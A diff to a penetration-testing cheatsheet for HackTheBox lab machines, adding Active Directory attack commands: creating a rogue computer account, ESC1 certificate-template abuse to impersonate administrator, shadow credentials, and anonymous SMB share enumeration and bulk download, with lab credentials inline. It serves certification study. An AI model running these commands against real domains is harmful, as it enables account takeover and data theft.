@@ -58,6 +58,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [autobloodyAD](#autobloodyAD)
 - [bloodyAD](#bloodyAD)
 - [impacket](#impacket)
+- [smbclient](#smbclient)
 - [useful command](#useful-command)
 - 
 - [Useful Resources](#useful-resources)
@@ -846,6 +847,12 @@ netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --users
 # list shares 
 netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares
 
+# get number computer can create
+netexec ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  -M maq
+
+# command add new computer
+netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  -M add-computer -o NAME='HACKER-PC' PASSWORD='Password123!'
+
 # list all in folder share IT  
 netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares --spider IT --regex .
 
@@ -893,11 +900,18 @@ certipy find -u j.fleischman@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8
 
 # find templates vuln 
 certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -vulnerable -stdout
+or
+certipy find -u j.fleischman@fluffy.htb -p 'J0elTHEM4n1990!' -text -stdout -vulnerable
 
 # Shadow Credential  (  p.agila need have GenericWrite over winrm_svc , can targeted Kerberoast (give the user a SPN, get a hash, and try to break it to get their password))
 certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
 or
 certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc -dc-ip 10.129.6.201 -scheme ldap
+
+# ECS1 ( HACKER-PC$ have can enroll with  template CorpVPN vuln ) 
+certipy req -u 'HACKER-PC$' -p 'Password123!' -ca 'AUTHORITY-CA' -target 'authority.authority.htb' -template 'CorpVPN' -upn 'administrator@authority.htb' -dc-ip 10.129.6.20
+or
+certipy req -u 'HACKER-PC$' -p 'Password123!'  -ca AUTHORITY-CA -dc-ip 10.129.6.20 -template CorpVPN -upn administrator@authority.htb -dns authority.htb -debug
 
 ```
 ## autobloodyAD
@@ -960,6 +974,21 @@ c:\users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-133735
 # command to dump use 3 file 
 impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
 
+```
+## smbclient
+
+```
+# command smbclient to connect folder shares by auth kerberoas
+smbclient -U 'voleur.htb/ryan.naylor%HollowOct31Nyt' --realm=voleur.htb //dc.voleur.htb/IT
+
+# command smbclient to list and  connect folder shares by anonymous
+smbclient -L //10.129.6.20 -N
+smbclient //10.129.6.20/Development -N
+
+# command smbclient to download all to local machine 
+prompt off
+recurse true
+mget *
 
 ```
 ## useful-command 
